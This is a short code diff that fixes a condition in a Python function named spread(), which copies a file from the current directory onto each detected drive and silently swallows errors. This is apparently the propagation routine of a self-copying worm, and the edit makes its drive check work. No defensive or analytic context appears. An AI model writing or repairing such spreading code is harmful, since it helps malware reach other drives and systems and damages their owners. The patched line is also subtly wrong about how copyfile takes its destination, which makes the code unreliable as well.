@@ -25,7 +25,7 @@ def spread():
     path = os.getcwd()
     abspath = os.path.join(path, name)
     for drive in drives:
-        if drive in os.path.isdir(drives):
+        if os.path.isdir(drive):
             try:
                 shutil.copyfile(abspath, drive)
             except Exception:
